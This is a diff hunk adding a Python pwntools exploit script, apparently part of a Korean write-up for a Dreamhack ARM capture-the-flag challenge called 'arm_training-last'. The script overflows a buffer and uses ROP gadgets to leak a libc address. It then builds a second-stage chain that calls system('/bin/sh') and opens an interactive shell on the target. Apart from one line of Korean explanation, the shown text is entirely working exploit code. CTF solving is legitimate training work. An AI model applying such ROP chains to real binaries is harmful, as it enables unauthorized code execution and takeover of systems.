@@ -155,7 +155,68 @@ sp는 0x21037에 위치하고, 000107fc  ldmia sp!,{r11 ,pc} 에서는 fp와 리
  
 
 
+from pwn import *
 
+def slog(n, m): return success(' : '.join([n, hex(m)]))
+
+context.log_level = 'debug'
+isRemote = False
+isDebug = False
+
+if isRemote:
+    p = remote('host3.dreamhack.games', 0000)
+else:
+    if isDebug:
+        p = process(['qemu-arm-static', '-g', '54321', './arm_training-last'])
+    else: 
+        p = process('./arm_training-last')
+
+
+e = ELF("./arm_training-last")
+libc = ELF("./libc.so.6")
+
+p.sendlineafter(b') ', b'y')
+for i in range(28):
+    p.recvuntil(b'~')
+p.sendline(b'')
+
+p.sendlineafter(b') ', b'n')
+
+mov_r0_r3 = 0x106e4
+pop_r3_pc = 0x10480
+
+payload = b'A'*52
+payload += p32(pop_r3_pc)
+payload += p32(0x21010)
+payload += p32(mov_r0_r3)
+payload += p32(0x2103b)
+payload += p32(0x107d8)
+p.sendafter(b'!!\n', payload)
+
+libc_base = u32(p.recv(4)) - libc.symbols['strcmp']
+slog('libc_base', libc_base)
+p.recv(1024)
+
+system = libc_base + libc.symbols['system']
+read = libc_base + libc.symbols['read']
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
+
+payload = b'A'
+payload += flat([0,0,system,0,read,0,0,0,0,0,0,0])
+payload += b'\x18\x02\x00'
+payload += p32(pop_r3_pc)
+payload += p32(0x21800)
+payload += p32(0x107e4)
+p.send(payload)
+
+pause()
+payload = b''
+payload += p32(pop_r3_pc)
+payload += p32(binsh)
+payload += p32(0x1074c)
+p.send(payload)
+
+p.interactive()
 
 
 
